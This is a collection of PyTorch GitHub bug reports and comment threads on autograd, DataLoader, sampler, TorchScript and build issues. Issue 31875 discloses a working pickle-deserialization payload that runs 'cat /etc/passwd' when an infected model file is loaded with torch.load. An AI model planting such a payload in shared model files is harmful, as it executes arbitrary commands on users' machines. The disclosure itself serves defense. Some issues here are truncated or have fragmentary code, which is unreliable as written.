title: PyTorch issue 26596
body:
## 🐛 Bug

An `nn.Embedding` object with `max_norm` set to `True` causes a RuntimeError that is hard to track.

## To Reproduce
The following code causes a RuntimeError. The error can be avoided by **removing the max_norm** feature or by **swapping Line a and Line b** in the code.
```
import torch
import torch.nn as nn

n, d, m = 3, 5, 7
batch_size = 11

embedding = nn.Embedding(n, d, max_norm=True)
W = torch.randn((m, d), requires_grad=True)
optimizer = torch.optim.Adam(list(embedding.parameters()) + [W], lr=1e-3)

optimizer.zero_grad()
idx = torch.tensor([1, 2])

a = embedding.weight @ W.t()  # Line a 
b = embedding(idx) @ W.t()    # Line b

out = (a.unsqueeze(0) + b.unsqueeze(1))
loss = out.sigmoid().prod()
loss.backward()
optimizer.step()
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-472-103ef18503d8> in <module>
     17 out = (a.unsqueeze(0) + b.unsqueeze(1))
     18 loss = out.sigmoid().prod()
---> 19 loss.backward()
     20 optimizer.step()

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    116                 products. Defaults to ``False``.
    117         """
--> 118         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    119 
    120     def register_hook(self, hook):

~/miniconda3/envs/kg/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     91     Variable._execution_engine.run_backward(
     92         tensors, grad_tensors, retain_graph, create_graph,
---> 93         allow_unreachable=True)  # allow_unreachable flag
     94 
     95 

RuntimeError: one of the variables needed for gradient computation has been modified by an inplace operation: [torch.FloatTensor [3, 5]] is at version 2; expected version 1 instead. Hint: enable anomaly detection to find the operation that failed to compute its gradient, with torch.autograd.set_detect_anomaly(True).
```

## Expected behavior
There shouldn't be any error when running the code above.
Strangely, there is no RuntimeError when **Line a** and **Line b** are swapped. This is something that has to be investigated.

## Environment

PyTorch version: 1.2.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.3 LTS
GCC version: (Homebrew gcc 5.5.0_4) 5.5.0
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce GTX 1080 Ti
Nvidia driver version: 430.26
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.3

Versions of relevant libraries:
[pip] botorch==0.1.3
[pip] gpytorch==0.3.5
[pip] numpy==1.17.2
[pip] torch==1.2.0
[pip] torchvision==0.4.0a0+6b959ee
[conda] blas                      1.0                         mkl
[conda] botorch                   0.1.3                    pypi_0    pypi
[conda] gpytorch                  0.3.5                    pypi_0    pypi
[conda] libblas                   3.8.0                    12_mkl    conda-forge
[conda] libcblas                  3.8.0                    12_mkl    conda-forge
[conda] liblapack                 3.8.0                    12_mkl    conda-forge
[conda] mkl                       2019.4                      243
[conda] pytorch                   1.2.0           py3.7_cuda10.0.130_cudnn7.6.2_0    pytorch
[conda] torchvision               0.4.0                py37_cu100    pytorch

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry
comments:
[VitalyFedyunin]: Per documentation (of functional.embedding):

max_norm (float, optional): If given, each embedding vector with norm larger than `max_norm`                                    is renormalized to have norm `max_norm`. **Note: this will modify `weight` in-place.**

So we need to update https://pytorch.org/docs/stable/nn.html#embedding accordingly.

---

[dschaehi]: I see. Could you explain why swapping Line a and Line b then does *not* lead to the same error?

By the way, setting `max_norm` to `True` allows for back propagation in normal case. Otherwise it won't make sense to use `max_norm` at all in practice. Perhaps what matters in my example above is when the normalization step happens, i.e., whether it happens immediately after back propagation or during back propagation.

---

[VitalyFedyunin]: Because when you call `embedding(idx)` it actually does `F.embedding` which (with `max_norm` provided) inplace modifies `embedding.weight`

---

[dschaehi]: I am wondering whether one could introduce an embedding normalization function that  is a subclass of `Function`, which applies `torch.embedding_renorm_` in the forward pass, but leaves the gradients unchanged in the backward pass. This way one could avoid the error above?

---

[nirkra]: This is a super critical bug, when used with DDP, causes embedding to be out of alignment and is detrimental for training. Furthermore, warning doesn't exist in nn.Embedding (only in F.ebmedding), assuming someone would read the code and realize underlying F.embedding, this must be detrimental for hundreds of projects that rely on embedding combined with DDP.....

---

[VitalyFedyunin]: I will bump priority on it as it seems not only docs issue, and many people hitting it.

---

[kurtamohler]: To me, it seems like we have at least two options to solve this issue:

1. Keep the current behavior and update `torch.nn.Embedding`'s documentation to mention the in-place modification. Then the user will just have to make sure to clone the weight tensor before using it for another calculation that occurs before the `torch.nn.Embedding.forward()` call. Perhaps the documentation should have a clear warning that specifically suggests cloning to avoid this error. Note that in the repro script above, replacing the line `a = embedding.weight @ W.t()` with `a = embedding.weight.clone() @ W.t()` fixes the error.

2. Change`torch.nn.Embedding.forward()` to avoid the in-place modification by first cloning the weight tensor before giving it to `torch.nn.functional.embedding`, then setting `self.weight` to the new clone after the `embedding` call. The code snippet below shows what I mean. This fixes the error in the repro script and gives correct result. However, this would be a BC breaking change (although maybe this type of BC break is ok?). Currently, if the user provides a tensor `weight_` argument to `torch.nn.Embedding`, we don't create a clone of that tensor, so when it's modified in place, the user's reference to that weight tensor will still be pointing to the modified tensor. This behavior seems to be purposeful, since we have a test that checks this behavior explicitly (`test_embedding_from_pretrained_options` in `test_nn.py`). So if we do decide to create a clone of the weight tensor in the forward method, this behavior would change--the weight tensor that the user provided to `torch.nn.Embedding` would no longer be modified when the forward function is called.

```
        weight = self.weight if (self.max_norm is None) else Parameter(self.weight.clone())
        result = F.embedding(
            input, weight, self.padding_idx, self.max_norm,
            self.norm_type, self.scale_grad_by_freq, self.sparse)
        if self.max_norm is not None:
            self.weight = weight
        return result
```

Even though option 2 might seem more ideal, but maybe we should go with option 1, to avoid a BC break and to keep `torch.nn.Embedding` and `torch.nn.functional.embedding`'s behavior consistent. @VitalyFedyunin, does this make sense?

---

[VitalyFedyunin]: Both options make sense, but the first variant is much easier, especially taking into account that where is CPP version of nn, and we would need to keep in sync both as well as take perf impacts.

---

[tonygracious]: I am facing the same issue in pytorch 1.13.1

---

[kurtamohler]: @tonygracious, as the [documentation](https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html?highlight=embedding#torch.nn.Embedding) mentions, if you're doing operations on `embedding.weight` which you want to be differentiable, you just have to clone it first with `embedding.weight.clone()`.

title: PyTorch issue 27820
body:
## 🐛 Bug
trying to import `IterableDataset` in `torch.utils.data.dataset` creates an error in PyCharm. look at the following picture:
![图片](https://user-images.githubusercontent.com/44257865/66712058-9c6b5500-edc9-11e9-9492-64c416939e7b.png)

It says that `cannot find reference in dataset.pyi`, where in `dataset.pyi`, we can see that:
![图片](https://user-images.githubusercontent.com/44257865/66712088-f9670b00-edc9-11e9-9ad4-417bc791c207.png)

It's obviously that there is no `IterableDataset` but only its super class `Dataset` exists.
I believe it should be added.


## To Reproduce

title: PyTorch issue 28389
body:
## 🐛 Bug

The affinity of a worker process is reset after `torch.randperm` is called in the worker process.

## To Reproduce

Steps to reproduce the behavior:

1. Change the worker process affinity in the `worker_init_fn` function.
1. Call `torch.randperm` in the `__iter__` method of an IterableDataser.
1. Now the worker process affinity is back to the original one.

The following code sample reproduce the problem :

```
import os
import torch
import torch.utils.data

class TestDataset(torch.utils.data.IterableDataset):
    
    def __iter__(self):
        assert(len(os.sched_getaffinity(0)) == 1)
        torch.randperm(1)
        assert(len(os.sched_getaffinity(0)) == 1)
        return range(1)

def worker_init_fn(_):
    os.sched_setaffinity(0, list(os.sched_getaffinity(0))[0:1])
        
if __name__ == '__main__':
    assert(len(os.sched_getaffinity(0)) > 1)
    dataset = TestDataset()
    dataloader = torch.utils.data.DataLoader(dataset, num_workers=1, worker_init_fn=worker_init_fn)
    for _ in dataloader:
        pass
```

## Expected behavior

I except that a call to `torch.randperm` inside a worker process doesn't touch the process affinity.

## Environment

I use the Docker image `pytorch/pytorch:1.3-cuda10.1-cudnn7-runtime`.

```

[ezyang]: cc @ilia-cher

---

[gchanan]: Do we know if randperm is important here?  What if we use some other torch function?

---

[ludovicdelfau]: > 
> 
> Do we know if randperm is important here? What if we use some other torch function?

With these functions, I got the same error :

* torch.zeros(1)
* torch.get_num_threads()

But with these functions, I didn't get the error :

* torch.empty(1)
* torch.can_cast(torch.double, torch.float)
* torch.seed()

---

[peterbell10]: It looks like this is the default behaviour of intel's OpenMP implementation. I say this for three reasons:

1. I can only reproduce the issue on platforms with MKL/intel OpenMP
2. Setting the environment variable `KMP_AFFINITY=disabled` fixes the issue
3. Setting `KMP_AFFINITY=verbose` explicity shows openmp setting the affinity

```
OMP: Info #250: KMP_AFFINITY: pid 648 tid 648 thread 0 bound to OS proc set 0-7
OMP: Info #250: KMP_AFFINITY: pid 651 tid 651 thread 0 bound to OS proc set 0-7
```

In normal python code I see `kmp` doing this setup when `torch` is imported . However, in in the data loader (or any code using `multiprocessing`) it is delayed until the first function call that uses OpenMP. Adding a dummy call to `torch.get_num_threads` before the call to `os.sched_setaffinity` also works around the issue.

So, should we add a dummy OpenMP call into `DataLoader` as a workaround?

---

[ilia-cher]: I don't think we provide guarantees on thread affinity when using intra- or inter-op parallelism as of the moment. Technically, thread may change its core/processor depending on external factors (parallelization library used; afaik in some cases OS may choose to move threads, etc). Some affinity (e.g. usage of specific CPU) may be enforced on the process level (e.g. numactl).

---

[peterbell10]: The following code works correctly with `spawn` or `forkserver` but not with `fork`:

```python
import os
import torch
import multiprocessing as mp

def test(a):
    os.sched_setaffinity(0, [2])
    torch.randperm(1)

title: PyTorch issue 29352
body:
From what I observe when working on https://github.com/pytorch/pytorch/pull/29233, cusparse handle is managed the same way as cublas handle, therefore not thread-safe.

https://github.com/pytorch/pytorch/pull/29233 makes the handle pool mechanism which was originally used for cudnn generic, so it would also be able to use to manage cusparse handle. We should migrate the management of cusparse handle to that approach.

See also: https://github.com/pytorch/pytorch/issues/6962

title: PyTorch issue 30147
body:
## 🐛 Bug
`torch.utils.data.DataLoader` attempts to relay exceptions from its child processes.  It fails to do this when the exception type takes multiple required arguments.

## To Reproduce

Run this:
```
import torch.utils.data
class E(Exception):
    def __init__(self, a, b):
        pass
    def __str__(self):
        return "Special exception message"

class G(torch.utils.data.IterableDataset):
    def __iter__(self):
        raise E(a=1, b=2)
        yield 1
    
d = torch.utils.data.DataLoader(G(), num_workers=1)
next(iter(d))
```

The result:
```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py", line 819, in __next__
    return self._process_data(data)
  File "/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/utils/data/dataloader.py", line 846, in _process_data
    data.reraise()
  File "/usr/local/miniconda3/envs/openai/lib/python3.7/site-packages/torch/_utils.py", line 369, in reraise
    raise self.exc_type(msg)
TypeError: __init__() missing 1 required positional argument: 'b'
```

## Expected behavior

Should see the `E: Special exception message` printed. (This works when `num_workers=0`.)

## Environment
 - PyTorch Version (e.g., 1.0): 1.3.1
 - OS (e.g., Linux): Linux

title: PyTorch issue 31690
body:
## 🐛 Bug

A `nn.ConvTranspose2d` can be up to two orders of magnitude slower when the `output_padding` option is set to a nonzero value then when it isn't.

## To Reproduce

```
class Test(nn.Module):
    def __init__(self, output_padding):
        super().__init__()
        
        self.c1 = nn.ConvTranspose2d(128, 64, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c2 = nn.ConvTranspose2d(64, 32, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
        self.c3 = nn.ConvTranspose2d(32, 3, kernel_size=3, stride=2,
                                     padding=1, output_padding=output_padding)
    def forward(self, x):
        x = self.c1(x)
        x = nn.functional.relu(x)
        x = self.c2(x)
        x = nn.functional.relu(x)
        x = self.c3(x)
        x = nn.functional.relu(x)
        return x

def test(output_padding):
    network = Test(output_padding=output_padding).cuda()
    x = torch.rand((1028, 128, 6, 6)).cuda()


    for i in range(5):
        start = time.time()
        for i in range(10):
            network(x)
        print((time.time() - start) / 10)

test((0, 0))
test((1, 1))
```

On my V100 machine, I get timings of about 0.0004s per forward pass with `output_padding=(0, 0)` and about .05s with `output_padding=(1, 1)`.

## Expected behavior

Given that the `output_padding` option has minimal effect on the number of FLOPs required to compute the function, I would expect the computation time to be similar with and without the option.



## Environment

PyTorch version: 1.3.1
Is debug build: No
CUDA used to build PyTorch: 10.1.243

OS: Ubuntu 16.04.6 LTS
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130

title: PyTorch issue 31771
body:
## 🐛 Bug

<!-- A clear and concise description of what the bug is. -->
When using the torch.utils.data.distributed.DistributedSampler () function, the data set cannot be shuffled, and each epoch samples the data in the same order.

## To Reproduce

Steps to reproduce the behavior:
```python
import torch
import os
from torch.utils.data import Dataset, DataLoader
import numpy as np

os.environ["CUDA_VISIBLE_DEVICES"] = "0"

np.random.seed(5)

class RandomDataset(Dataset):
    def __init__(self):
        self.data = torch.rand(22, 1, 32, 32)
        self.name = torch.arange(1, 22)
        
    def __getitem__(self, idx):
        return self.name[idx], self.data[idx]
    
    def __len__(self):
        return len(self.data)
    

torch.distributed.init_process_group(backend="nccl")

dataset = RandomDataset()
sampler = torch.utils.data.distributed.DistributedSampler(dataset, shuffle=True) 
dataloader = DataLoader(dataset, 
    batch_size=5,   
    pin_memory=True, drop_last=True, sampler=sampler) 

for epoch in range(3):
    print("epoch: ", epoch)
    for i, data in enumerate(dataloader, 0):
        names, _ = data
        print(names)
```

Run this code by executing:
```
python -m torch.distributed.launch --nproc_per_node=1 test.py
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior
Expect different data batch combinations for each epoch.
for example:
In epoch 1, My code prints:
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])
In epoch 2, My code prints:

tensor([10,  4, 20, 19, 11])
tensor([ 2,  14, 17, 0,  1])
tensor([ 8,  6, 18, 16,  7])
and so on.
<!-- A clear and concise description of what you expected to happen. -->
But now, the output is:
epoch:  1
tensor([10,  4, 15,  3, 11])
tensor([ 5,  9, 20, 19, 13])
tensor([ 2,  0, 18, 16,  7])
tensor([ 8,  6, 14, 17,  1])

tensor([ 5,  9, 20, 19, 13])

[ezyang]: I am not too sure about the severity of this issue, but it seems that it could be quite severe (silent correctness problem). I have raised the priority pending a look from someone more familiar.

[kangcp]: > I am not too sure about the severity of this issue, but it seems that it could be quite severe (silent correctness problem). I have raised the priority pending a look from someone more familiar.

ok，Thank you.

---

[kangcp]: @ezyang Hi,  I think I have found the bug.
https://pytorch.org/docs/stable/_modules/torch/utils/data/distributed.html#DistributedSampler.
This is the source code of DistributedSampler. 
In the __iter__()  function, there are two lines of code: 
```python
g = torch.Generator ()
g.manual_seed (self.epoch)
```
So in each epoch, A new Generator object is generated every time, and the seed is the same every time. Therefore, each epoch will sample the data set in the same order. The solution to solve this problem is to turn the Generator into a global property, such as add the follow code into the __init__() function.
```python
g = torch.Generator ()
g.manual_seed (self.epoch) 
self.g = g
```
Of course，the following line of code (in the __iter__()) should also be changed accordingly:
indices = torch.randperm(len(self.dataset), generator=self.g).tolist()

---

[kangcp]: @ezyang  I found a set_epoch() function in the DistributedSampler source code, but I haven't found any place to call this function. This needs to be called manually by the user? I didn't find a description in the doc file, and there was no description of this function in the doc file.

---

[vfdev-5]: @kangcp you need to call `set_epoch` as here: https://github.com/pytorch/examples/blob/master/imagenet/main.py#L239

---

[kangcp]: > @kangcp you need to call `set_epoch` as here: https://github.com/pytorch/examples/blob/master/imagenet/main.py#L239

Thank you, I have call that.

---

[pritamdamania87]: @kangcp Can this issue be closed out?

---

[rgommers]: This requires at least a documentation update before the issue can be closed.

There's also an implementation issue, `g.manual_seed(self.epoch)` inside `DistributedSampler` is a very low-entropy way to seed. The `manual_seed` docstring recommends against this: *It is recommended to set a large seed, i.e. a number that has a good balance of 0 and 1 bits. Avoid having many 0 bits in the seed.* It may not be possible to change it anymore due to backwards compatibility, but I'll have a look if there's something that can be done or to warn the user.

title: PyTorch issue 31875
body:
## 📚 Documentation

PyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.
It concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))

### Example script, that infects any existing model:

```python
import torch
import pickle

ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system('cat /etc/passwd')
"""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('inception_v3_google-1a9a5a14.pth')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'evil.pth')
```

Then, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.

### Small demo:
![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)

### Proposed solution
As an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models

cc @ezyang @gchanan @zou3519
comments:
[soumith]: adding a Warning in the documentation seems worthwhile.

---

[vadimkantorov]: @soumith this is quite nasty issue... imagine a hacker cooks a model file that breaks PyTorch somehow, then creates an issue and someone from FB or other big company loads it on their work machine for debugging. Such a poisoned pickle thing could potentially do some bad things like steal browser cookies with access to internal systems or even something worse... it would be nice if there is a stronger mitigation... but maybe it’s not possible with pickle...

---

[zou3519]: Marking high-pri for the docs change

---

[cpuhrsch]: We'll add documentation to warn of this.

---

[EthanSteinberg]: One option that might be worth considering is using https://docs.python.org/3/library/pickle.html#restricting-globals to try to make the unpickling more safe. (With perhaps an additional flag to remove those protections).

title: PyTorch issue 32519
body:
## 🐛 Bug

If you take a look at the highlighted section: https://github.com/pytorch/pytorch/blob/4314620ba05bc1867f6a63455c4ac77fdfb1018d/torch/csrc/jit/script/module.cpp#L191-L203, you would notice that when `IValue s` is not a module, `Module r` will simply register it. Therefore, the new module will share the same parameters.

## To Reproduce

Steps to reproduce the behavior:

1. Load any TorchScript model `model`
2. Run `clone = model.clone()`
3. Find any parameter in `model` and that same parameter in `clone`, `isAliasOf` will evaluate to `true`

## Expected behavior

Expect `clone()` to deep copy  everything in a TorchScript model.

## Environment

N/A

## Additional context

N/A


cc @ezyang @gchanan @zou3519 @suo
comments:
[suo]: @jerryzh168: I feel that `clone()` is not well-defined and we are receiving many issues due to it not behaving as people expect.

I propose we follow more closely Python's scheme to avoid confusion:
- Implement a `deepCopy()` method on `script::Module` that clones all state of the module recursively. This includes cloning all tensors. The type should not be cloned; the new module should share the same time
- Implement `__deepcopy__` on the Python `torch.jit.RecursiveScriptModule` to call `deepCopy()` internally and return the new thing.
- If we have *any* other methods that do anything else, they should be explicitly hidden from the public API.

[jerryzh168]: clone without cloning the type is `clone_instance`, we have that here: https://github.com/pytorch/pytorch/blob/master/torch/csrc/jit/script/module.cpp#L216
although currently it is not deepcopy.
`clone` is for cloning both type and instance actually. this is used when we want to modify the type of the cloned module, like in quantization. probably not going to be used for public I think

---

[suo]: @jerryzh168 `clone_instance` also does not clone parameters.

---

[jhhurwitz]: A deepcopy `clone`, if possible, would be useful for applications like multi-gpu training.

[ZolotukhinM]: Yeah, in the current state it probably would makes sense to:
1) change `clone_instance` to be a deep copy (i.e. add copying of tensors to it)
2) rename it to `clone` and make it the public API for cloning/copying
3) remove the current `clone` (that creates a new type) from the public API. It probably will still be used internally in implementations of freezing and quantization, but external users probably would never need that (~never would be able to use it correctly without understanding of underlying mechanisms)

title: PyTorch issue 32645
body:
## 🐛 Bug

In `torch/optim/lr_scheduler.pyi`, type of `LambdaLR`'s constructor is

```python
class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: float, last_epoch: int=...) -> None: ...
```

but description of `LambdaLR` in `torch/optim/lr_scheduler.py` is as follow.

```python
class LambdaLR(_LRScheduler):
    """Sets the learning rate of each parameter group to the initial lr
    times a given function. When last_epoch=-1, sets initial lr as lr.

    Args:
        optimizer (Optimizer): Wrapped optimizer.
        lr_lambda (function or list): A function which computes a multiplicative
            factor given an integer parameter epoch, or a list of such
            functions, one for each group in optimizer.param_groups.
        last_epoch (int): The index of last epoch. Default: -1.

    Example:
        >>> # Assuming optimizer has two groups.
        >>> lambda1 = lambda epoch: epoch // 30
        >>> lambda2 = lambda epoch: 0.95 ** epoch
        >>> scheduler = LambdaLR(optimizer, lr_lambda=[lambda1, lambda2])
        >>> for epoch in range(100):
        >>>     train(...)
        >>>     validate(...)
        >>>     scheduler.step()
    """
```

I think type of `LambdaLR` should be as follow.

```python
LRLambdaType = Callable[[int], float]

class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: Union[LRLambdaType, List[LRLambdaType]], last_epoch: int=...) -> None: ...
```


cc @vincentqb
comments:
[vincentqb]: I agree that the type should be updated. `lr_lambda` returns a float though. Did you mean the following?

```python
LRLambdaType = Callable[[int], float]

class LambdaLR(_LRScheduler):
    def __init__(self, optimizer: Optimizer, lr_lambda: Union[LRLambdaType, List[float]], last_epoch: int=...) -> None: ...
```

Please feel free to open a PR for this.

---

[jeongukjae]: @vincentqb No. `lr_lambda` takes a function that returns a float and takes a int, or a list of such functions . So type of `lr_lambda` should be `Callable[[int], float]` or `List[Callable[[int], float]]`. You can see `lr_lambda` takes list of lambda functions in the example of `LambdaLR`.

---

[vincentqb]: > @vincentqb No. `lr_lambda` takes a function that returns a float and takes a int, or a list of such functions . So type of `lr_lambda` should be `Callable[[int], float]` or `List[Callable[[int], float]]`. You can see `lr_lambda` takes list of lambda functions in the example of `LambdaLR`.

title: PyTorch issue 32983

## 🐛 Bug

PyTorch's `libtorch.so` exposes a lot of CUDNN API symbols. This causes issues when our application (independent from PyTorch) uses a different CUDNN version.

---

[pranavm-nvidia]: Sorry, "it" was referring to my application. 

I just need to make sure my application is using the right cuDNN library; I'm fine with PyTorch using whatever it needs to (presumably what it statically links). 

I think the only thing that needs to be done in PyTorch to fix the issue I see is to hide the cuDNN symbols, either [during linking](https://accu.org/index.php/journals/1372), or afterwards, with something like `strip`

---

[mcarilli]: Pytorch already has [visibility control](https://github.com/pytorch/pytorch/blob/master/c10/macros/Export.h) for the functions it defines internally (and therefore probably compiles with `-fvisibility` although I'm not 100% sure of that for the binary builds).  Do you know if we expect compiling `libtorch.so` with `-fvisibility` to hide symbols for externally defined functions, ie, the symbols for the definitions that statically linking against cudnn pulls in?

edit:  after experimenting with minimal examples, it seems compiling and linking a consumer cpp files with `-fvisibility` is _not_ sufficient to hide symbols that are declared in the consumer then statically linked against some other, precompiled static lib.

---

[pranavm-nvidia]: I'm not sure if that's a reliable way to hide symbols from an external, statically linked library. For example, cuDNN might be using visibility attributes, and if you just use `-fvisibility`, I'd imagine that they would be visible in the final library (and they are, as we can see from inspection). 

In fact, it seems that the [linker doesn't impose visibility constraints on static archives](https://stackoverflow.com/a/2251477), so I guess it wouldn't work even if cuDNN doesn't use visibility specifiers.

However, it looks like there's a linker option that can fix this, which might be a lot easier than the solutions I suggested earlier: [-Wl,--exclude-libs](https://sourceware.org/binutils/docs/ld/Options.html)

---

[mcarilli]: After playing with minimal working samples, if you `-Wl,--exclude-libs,libdummy.a` when creating `libwhatever.so` by linking file(s) including `libdummy.a`, symbols statically linked from `libdummy.a` are hidden in the final `libwhatever.so`, even if `libdummy.a` was compiled with default visibility.

Another working solution is applying pragmas to declarations for symbols you want to hide in consumer (ie Pytorch) cpp files:
```C++
#pragma GCC visibility push(hidden)
#include "cudnn_whatever.h"
#pragma visibility pop
```
Then, even if cudnn is statically linked, and even if the cudnn static library was compiled with default visibility, the resulting `libtorch_whatever.so` should hide the cudnn symbols.  See [here](https://gcc.gnu.org/wiki/Visibility), ctrl+f
>#pragma GCC visibility is stronger than -fvisibility; it affects extern declarations as well.

One caveat:  The above reference has some strong warnings about accidentally hiding exception types (ie exceptions that might be thrown by cudnn).  At least I _think_ that's what it's saying, I don't fully understand it.

Two caveat:  the above suggestions are GCC-specific.  I don't know how to rig an equivalent for windows or mac.

---

[pranavm-nvidia]: I don't think cuDNN defines any exceptions, but assuming it did, would PyTorch propagate those (or any other cuDNN types) across its own library boundary? Wouldn't they be caught and handled internally?

If you need more fine-grained control (I don't think you do for cuDNN), a [linker exports map](https://accu.org/index.php/journals/1372) might be the easiest way

---

[mcarilli]: I don't know enough about the build system to decide the right approach here.  I'll ping devs on pytorch slack.

---

[soumith]: `-Wl,exclude-libs` is a reasonable and easy fix, we should do it.

Presumably, has to be inserted here: https://github.com/pytorch/pytorch/blob/6e4f99b0633f704f8c7bf3bb3b9733680f5dc18b/cmake/public/cuda.cmake#L256-L271

follow along `USE_STATIC_CUDNN=1`

title: PyTorch issue 3307
body:
I ran into unexpected behaviour with `copy.deepcopy` applied to a `Variable`. The gradient buffer of the `Variable` is not copied.
```
a = torch.autograd.Variable(torch.ones(1))
a.grad = torch.autograd.Variable(torch.ones(1))
b = copy.deepcopy(a)
print(b.grad)
```
I think it would be a good idea to copy the gradient buffer during a deep copy. My use case is recording the gradient of a model's parameter space for optimization research. This would also be useful for debugging/development of complex models that involve atypical gradient operations.

This is handled here: https://github.com/pytorch/pytorch/blob/5760b036fb338eacd641418321f23aee51b1aee9/torch/autograd/variable.py#L89-L97

A solution would be to also copy the `grad` attribute of the current `Variable`, which would involve a recursion of the deep copy since the grad attribute is also a `Variable`.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @gqchen @pearu @nikitaved @soulitzer @SsnL

```java
class Tensor(torch._C._TensorBase):
	def __deepcopy__(self, memo):
		if self.is_leaf:
			if id(self) in memo:
				return memo[id(self)]
			with torch.no_grad():
				if self.is_sparse:
					new_tensor = self.clone()
				else:
					new_storage = self.storage().__deepcopy__(memo)
					new_tensor = self.new()
					new_tensor.set_(new_storage, self.storage_offset(), self.size(), self.stride())
				memo[id(self)] = new_tensor
				new_tensor.requires_grad = self.requires_grad
				return new_tensor
		else:
			if id(self) in memo:
				return memo[id(self)]
			if self.is_sparse:

			new_tensor.requires_grad = self.requires_grad
			if self.grad is not None:
				new_tensor.grad = self.grad.__deepcopy__(memo)
			memo[id(self)] = new_tensor

c.weight.grad = torch.rand((10, 1))

print(c.weight.grad)
d = copy.deepcopy(c)
print(d.weight.grad)
`
Tested with version 1.13.1. Running the code from @albanD gives the expected result. It would be great if we could find a way to copy an entire (larger) model including its gradients without having to copy every one by hand.

title: PyTorch issue 33928
body:
## 🐛 Bug

`Caffe2Targets.cmake` from pytorch installed by conda has hard-coded library path, which will make targets depending on torch unable to build, if the CUDA installation directory is different from `/usr/local/cuda`. Specifically in my case, I installed pytorch `py3.6_cuda9.2.148_cudnn7.6.3_0` and the Caffe2 target file contains:

```
set_target_properties(torch PROPERTIES
  INTERFACE_COMPILE_DEFINITIONS "_THP_CORE;AT_PARALLEL_OPENMP=1"
  INTERFACE_COMPILE_OPTIONS "-Wall;-Wextra;-Wno-unused-parameter;-Wno-missing-field-initializers;-Wno-write-strings;-Wno-unknown-pragmas;-Wno-missing-braces;-fopenmp"
  INTERFACE_INCLUDE_DIRECTORIES "${_IMPORT_PREFIX}/include;${_IMPORT_PREFIX}/include"
  INTERFACE_LINK_LIBRARIES "protobuf::libprotobuf;c10;Threads::Threads;caffe2::mkl;caffe2::mkldnn;torch::cudart;c10_cuda;/usr/local/cuda/lib64/libnvToolsExt.so;/usr/local/cuda/lib64/libcudart.so;caffe2::cufft;caffe2::curand;caffe2::cudnn;/usr/local/cuda/lib64/libculibos.a;dl;caffe2::cublas"
)
```
## To Reproduce

I'm working on an example for pytorch with CMake, you can find it here: https://github.com/cmpute/pytorch-cmake-example.

If I remove the hard-coded libraries in `Caffe2Targets.cmake`, then the compilation of my extension will succeed.

## Expected behavior

The example is fairly simple, but when you try to build the package, there will be an error:

```log

    "cmake" "--build" "." "--target" "install" "--config" "Release" "--"

    /home/jacobz/pytorch-cmake-example
  Working directory:
    /home/jacobz/pytorch-cmake-example/_skbuild/linux-x86_64-3.6/cmake-build
Please see CMake's output for more information.

## Environment

title: PyTorch issue 33950
body:
Right now StorageImpl records a dtype. We should remove the dtype and store bytes directly. Non-POD dtypes should still support custom destruction, but that is built on top of an otherwise untyped representation. Representing storage impls in an untyped way means that we can reinterpret cast tensors, e.g., view a float tensor as a complex tensor.

In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

cc @ezyang @gchanan @zou3519 @anjali411 @dylanbespalko
comments:
[ezyang]: @anjali411 and I discussed and we think this is high priority for complex project. Not urgent, but should be done.

---

[dylanbespalko]: This would be great. Way beyond my abilities, but I would love to see it.

---

[vadimkantorov]: I wish storages were united also in relation with https://github.com/pytorch/pytorch/issues/34646 https://github.com/pytorch/pytorch/issues/34649 https://github.com/pytorch/pytorch/issues/34651

---

[kurtamohler]: I'll start on it this week.

---

[ezyang]: @kurtamohler let's have a brief call to talk about general design

---

[kurtamohler]: @ezyang , sure let's do it. Maybe just give me a little time to familiarize myself a bit more with how StorageImpl currently works. When would be a good time for you to talk?

---

[ezyang]: whenever you feel ready ping me on slack

---

[kurtamohler]: To summarize what Ed and I talked about last week for this issue:

This is going to be a change that touches a fairly large number of files since Storage/StorageImpl are used in a lot of places, so it makes sense to split this up into multiple step-wise PRs. Here's a general idea of those steps will be. @ezyang , please correct me if I missed anything.

